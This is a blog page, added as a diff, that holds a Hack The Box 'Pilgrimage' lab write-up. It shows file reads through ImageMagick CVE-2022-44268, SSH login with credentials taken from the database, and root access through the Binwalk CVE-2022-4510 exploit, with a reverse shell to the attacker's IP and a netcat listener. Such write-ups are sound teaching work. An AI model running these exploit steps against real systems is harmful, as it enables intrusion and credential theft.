@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Pilgrimage :: Welcome</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Experience the ultimate cyber adventure with &#39;pilgrimage&#39; an incredibly cool CTF journey." />
+<meta name="keywords" content="CVE-2022-44268 , CVE-2022-4510, htb" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/pilgrimage/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Pilgrimage">
+<meta property="og:description" content="Experience the ultimate cyber adventure with &#39;pilgrimage&#39; an incredibly cool CTF journey." />
+<meta property="og:url" content="/posts/pilgrimage/" />
+<meta property="og:site_name" content="Welcome" />
+
+  
+  
+  <meta property="og:image" content="">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-13 15:06:26 &#43;0100 &#43;01" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    [Achux21@b0x:~]#
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">home</a></li>
+        
+      
+        
+          <li><a href="/">My-writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >home</a></li>
+        
+      
+        
+          <li><a href="/" >My-writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/pilgrimage/">Pilgrimage</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-13[Updated::2023-07-13]</time><span class="post-author">Achux21</span><span class="post-reading-time">3 min read (616 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="tags/hack-the-box/">Hack-The-Box</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <table>
+<thead>
+<tr>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Easy</td>
+</tr>
+</tbody>
+</table>
+<p><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&amp;size=35&amp;pause=1000&amp;color=6A0DAD&amp;width=435&amp;lines=Pilgrimage" alt="Typing SVG"></a></p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/f56ab56c-d668-4104-804d-36911918050f" alt="image"></p>
+<h1 id="enum">Enum<a href="#enum" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Let&rsquo;s start with a quick Nmap scan.</p>
+<h3 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@Fs:.../HTB/Pilgrimage# nmap -p- -oN Nmap -sCV -T4 pilgrimage.htb 
+<span style="color:#75715e"># Nmap 7.80 scan initiated Sun Jun 25 16:17:30 2023 as: nmap -p- -oN Nmap -sCV -T4 pilgrimage.htb</span>
+Nmap scan report <span style="color:#66d9ef">for</span> pilgrimage.htb <span style="color:#f92672">(</span>10.10.11.219<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.34s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    nginx 1.18.0
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-git: 
+|   10.10.11.219:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the...
+|_    Last commit message: Pilgrimage image shrinking service initial commit. <span style="color:#75715e"># Please ...</span>
+|_http-server-header: nginx/1.18.0
+|_http-title: Pilgrimage - Shrink Your Images
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sun Jun 25 16:21:47 2023 -- 1 IP address (1 host up) scanned in 256.71 seconds</span>
+</code></pre></div><p>Let&rsquo;s check what&rsquo;s running on port 80.</p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/17d81c17-c872-440d-b3e8-d94e01776e80" alt="image"></p>
+<p>It seems to be an upload server, Let&rsquo;s try uploading something;</p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/a336d714-72c4-46a3-a3a6-c350a1b28554" alt="image"></p>
+<p>By reading the Nmap scan, we realized that there&rsquo;s a .git/ directory.
+Let&rsquo;s try to dump its contents.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git-dumper http://pilgrimage.htb/ git/
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@Fs:.../HTB/Pilgrimage# ls git/
+assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
+</code></pre></div><p>By reading the contents of those files, we found some interesting information.
+It appears that it&rsquo;s using SQLite as the database.</p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/0d63c601-be8e-4074-8e57-6efe1e773736" alt="image"></p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/727f3288-669e-441c-b466-4c3d51edac78" alt="image"></p>
+<p>It&rsquo;s using ImageMagick to convert images.</p>
+<p>By conducting a Google search, I found a <a href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">! CVE-2022-44268</a> (Common Vulnerabilities and Exposures) related to the discovered vulnerability.</p>
+<p>let&rsquo;s try This POC</p>
+<p>We have already identified the location where the DB stores data: &ldquo;/var/db/pilgrimage&rdquo;.</p>
+<p>Let&rsquo;s try to access this file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@Fs:.../Pilgrimage/imagemagick-lfi-poc# python3 generate.py  -f <span style="color:#e6db74">&#34;/var/db/pilgrimage&#34;</span> -o exploit.png
+
+   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> ImageMagick LFI PoC - by Sybil Scan Research &lt;research@sybilscan.com&gt;
+   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Generating Blank PNG
+   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Blank PNG generated
+   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Placing Payload to read /var/db/pilgrimage
+   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> PoC PNG generated &gt; exploit.png
+root@Fs:.../Pilgrimage/imagemagick-lfi-poc# convert exploit.png result.png
+</code></pre></div><p>Download Time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@Fs:.../Pilgrimage/imagemagick-lfi-poc# wget http://pilgrimage.htb/shrunk/64af576f46ee8.png
+--2023-07-13 02:46:53--  http://pilgrimage.htb/shrunk/64af576f46ee8.png
+Resolving pilgrimage.htb <span style="color:#f92672">(</span>pilgrimage.htb<span style="color:#f92672">)</span>... 10.10.11.219
+Connecting to pilgrimage.htb <span style="color:#f92672">(</span>pilgrimage.htb<span style="color:#f92672">)</span>|10.10.11.219|:80... connected.
+HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+Length: <span style="color:#ae81ff">1628</span> <span style="color:#f92672">(</span>1.6K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>image/png<span style="color:#f92672">]</span>
+Saving to: ‘64af576f46ee8.png’
+
+64af576f46ee8.png                     100%<span style="color:#f92672">[========================================================================</span>&gt;<span style="color:#f92672">]</span>   1.59K  --.-KB/s    in 0s      
+
+2023-07-13 02:46:54 <span style="color:#f92672">(</span><span style="color:#ae81ff">205</span> MB/s<span style="color:#f92672">)</span> - ‘64af576f46ee8.png’ saved <span style="color:#f92672">[</span>1628/1628<span style="color:#f92672">]</span>
+
+root@Fs:.../Pilgrimage/imagemagick-lfi-poc# convert 64af576f46ee8.png result.png
+root@Fs:.../Pilgrimage/imagemagick-lfi-poc# identify -verbose result.png 
+<span style="color:#f92672">[</span>output...<span style="color:#f92672">]</span>
+</code></pre></div><p>Let&rsquo;s copy the &ldquo;Raw profile type: &quot; string and decode it using CyberChef.</p>
+<p>From Hex;
+<img src="https://github.com/ACHUX21/Writeups/assets/130113878/6d9921f5-934c-4328-984e-1b34a93e5c39" alt="image"></p>
+<p>Let&rsquo;s Download the sqlite file
+<img src="https://github.com/ACHUX21/Writeups/assets/130113878/e4380801-0d68-4c84-b768-1710c9f1f2da" alt="image"></p>
+<p>Let&rsquo;s log in via SSH using those credentials.
+<img src="https://github.com/ACHUX21/Writeups/assets/130113878/02bd70c4-39d2-4bff-b2b9-160e853cfd00" alt="image"></p>
+<p>And we have successfully gained access .</p>
+<h1 id="priv-esc">Priv-esc<a href="#priv-esc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">emily@pilgrimage:~$ ls
+linPEAS.sh  pspy64  user.txt
+</code></pre></div><p>Let&rsquo;s run pspy64 first, followed by Linpeas, and hope to gather some valuable information.</p>
+<p>After 10 years HAAHAH, we finally discovered some interesting findings.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml"><span style="color:#ae81ff">2023</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">07</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">13</span> <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">06</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">18</span> <span style="color:#a6e22e">CMD</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">UID</span>=<span style="color:#ae81ff">0</span>     <span style="color:#a6e22e">PID</span>=<span style="color:#ae81ff">713</span>    <span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">bin</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">bash</span> <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">usr</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">sbin</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">malwarescan</span>.<span style="color:#a6e22e">sh</span>
+</code></pre></div><p>The content:</p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/7dedbc7c-8cb4-41bd-adb3-cb2e889daecf" alt="image"></p>
+<p>I wasted a lot of time before realizing that Binwalk is outdated and has a CVE !! <a href="https://www.exploit-db.com/exploits/51249">Binwalk v2.3.2 - Remote Command Execution (RCE)</a></p>
+<p>Let&rsquo;s utilize the ExploitDB script to gain root access</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+root@Fs:.../Pilgrimage/privesc# python3 exploit.py random-image.png 10.10.14.xxx <span style="color:#ae81ff">9999</span>
+
+<span style="color:#75715e">################################################</span>
+------------------CVE-2022-4510----------------
+<span style="color:#75715e">################################################</span>
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+<span style="color:#75715e">################################################</span>
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+<span style="color:#75715e">################################################</span>
+
+
+You can now rename and share binwalk_exploit and start your local netcat listener.
+
+root@Fs:.../Pilgrimage/privesc# scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shrunk/
+emily@10.10.11.219<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+bash: warning: setlocale: LC_ALL: cannot change locale <span style="color:#f92672">(</span>en_US.UTF-8<span style="color:#f92672">)</span>
+binwalk_exploit.png                                                                                                  100% <span style="color:#ae81ff">1084</span>     3.4KB/s   00:00    
+
+</code></pre></div><p>and we have access</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@Fs:.../Pilgrimage/privesc# nc -lnvp <span style="color:#ae81ff">9999</span>
+Listening on 0.0.0.0 <span style="color:#ae81ff">9999</span>
+Connection received on 10.10.11.219 <span style="color:#ae81ff">46362</span>
+ls
+_binwalk_exploit.png.extracted
+_e.png.extracted
+whoami
+root
+id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+^Z
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+  Stopped                 nc -lnvp <span style="color:#ae81ff">9999</span>
+root@Fs:.../Pilgrimage/privesc# stty raw -echo;fg
+nc -lnvp <span style="color:#ae81ff">9999</span>
+             root@pilgrimage:~/quarantine# export TERM<span style="color:#f92672">=</span>xterm-256color
+root@pilgrimage:~/quarantine# export SHELL<span style="color:#f92672">=</span>/bin/bash
+root@pilgrimage:~/quarantine# ls
+_binwalk_exploit.png.extracted	_e.png.extracted
+root@pilgrimage:~/quarantine# ls /root
+quarantine  reset.sh  root.txt
+root@pilgrimage:~/quarantine# 
+</code></pre></div><p>Goodbye! 💜</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/sau/">
+                <span class="button__text">Sau</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Achux21</span>
+    
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
